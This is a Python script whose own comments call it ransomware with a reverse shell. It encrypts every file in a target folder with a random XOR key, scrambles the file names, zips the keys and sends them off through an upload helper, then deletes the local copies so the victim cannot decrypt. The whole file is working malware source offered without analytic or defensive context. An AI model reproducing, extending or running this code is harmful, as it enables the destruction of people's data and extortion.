# scripted by n4zgu1

# reverse_shell and ransomware
# hide .zip in image

from datetime import datetime
import os
from upload import upload
from zip import *
from cleanUp import clean
from filename import *
# from pbar import pbar
import socket

thispath = os.getcwd()
hostname = socket.gethostname()

target = 'testfolder' # targeting folder
keyfolder = 'd3vil-keys/' #path to safe keyfiles
zpname = hostname.replace(' ', '-') + '.zip' #path to zip-file
sep = '#SEP#'

def encrypt_medium(src, dst):
    print(f"Encrypt medium: {src}\nKeyfile: {dst}\n")
    for path, dirs, files in os.walk(src): #check for files
        if len(files) > 0:  #check if file isnot empty
            for file in files:
                #Creating key_file for actual file
                key_dst = (path + '/.').replace(src, dst)
                #Encrypt file
                encrypt(path + '/', key_dst, file)


def encrypt(src, key_dst, filename):
    #creating path to key_file
    to_encrypt = open(src + filename, 'rb').read()
    size = len(to_encrypt)
    key = os.urandom(size)
    if not os.path.exists(os.path.dirname(key_dst)):
        os.makedirs(os.path.dirname(key_dst))
    with open(key_dst + filename + '.key', 'wb') as key_out:
        key_out.write(key)
    encrypted = bytes(a ^ b for (a, b) in zip(to_encrypt, key))

    with open(src + filename, 'wb') as encrypted_out:
        encrypted_out.write(encrypted)
        print(f'Encrypted {src}{filename}')


if __name__ == "__main__":
    if os.path.exists('log.txt') == True:
        os.remove('log.txt')
        
    now = datetime.now()    #get actual time
    now = now.strftime('%H:%M:%S')
    
    try:
        #encrypt target
        filename = encrypt_medium(target, keyfolder)
        print(f'\nENCRYPTED {target} [x]')
        error = "no error"
    except Exception as e:
        print(f'\nENCRYPTED {target} [ ]')
        
    writepath(target, keyfolder, sep)   #safe pathnames in a file and log answer
    encrName(target)                    #encrypr filenames and log answer
    
    try:
        #zip keyfile folder
        with zipfile.ZipFile(zpname, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipdir(keyfolder, zipf)
        #send keyfile-zip via email
        if upload(zpname) == True:
            #remove keyfiles (folder and zip)
            clean(keyfolder)
            os.remove(zpname)

    except Exception as e:
        ans = 'Some Error occurred!!'
        print(ans)
                
        print(e)
        exit()
